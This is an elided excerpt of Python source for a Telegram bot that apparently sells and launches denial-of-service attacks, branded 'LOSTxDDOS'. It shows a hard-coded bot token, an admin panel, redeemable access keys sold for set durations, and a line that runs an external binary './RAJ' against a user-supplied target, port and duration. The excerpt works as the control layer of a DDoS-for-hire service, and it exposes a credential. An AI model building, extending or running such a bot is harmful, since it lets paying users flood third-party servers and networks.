...
bot = telebot.TeleBot('7255031773:AAFTn3H2chqUyTG-n5WoAuquobpCaf3ay_o')
...
def start_command(message):
    ...
    admin_panel_button = types.KeyboardButton("🔰PANEL")
    if str(message.chat.id) in admin_id:
        markup.add(admin_panel_button)
    markup.add(attack_button, myinfo_button, redeem_button,  bot_sitting_button)
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 ⏤͟͟͞͞ 𝐋𝐎𝐒𝐓𝐱𝐃𝐃𝐎𝐒 ツ!", reply_markup=markup)
...
def genkey_command(message):
    ...
    durations = ["1hour", "5hours", "1day", "3days", "4days", "5days", "6days", "7days", "15days"]
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./RAJ {target} {port} {attack_time} 900"  # ✅ Correct variable name
